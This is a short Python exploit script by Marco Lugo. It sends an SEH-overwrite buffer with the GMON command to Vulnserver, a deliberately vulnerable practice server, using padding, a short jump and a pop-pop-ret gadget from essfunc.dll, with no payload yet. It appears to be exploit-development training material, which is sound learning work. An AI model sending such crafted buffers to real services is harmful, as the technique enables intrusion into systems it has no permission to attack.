#########################################################################################
# Title: Vulnserver GMON command SEH exploit
# Author: Marco Lugo
# Description: execute first stage -> payload jump forward. The jump gives us control over
#	       28 bytes.
#
#              To get Stephen Bradshaw's Vulnserver, visit:
#              http://www.thegreycorner.com/2010/12/introducing-vulnserver.html
#########################################################################################

import socket
import sys
import os
import struct

pop_pop_ret = struct.pack('<I', 0x625010B4) #essfunc.dll
first_stage = '\xEB\x06\x41\x41' # jump forward, hop over the island

target_ip = sys.argv[1]
buffer = 'GMON /.:/' 
pattern = '\x41'*1999 + '\x42'*1496 + first_stage + pop_pop_ret + '\x43'*1697
buffer += pattern

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((target_ip, 9999))
sock.recv(1024)
sock.send(buffer)
sock.close()
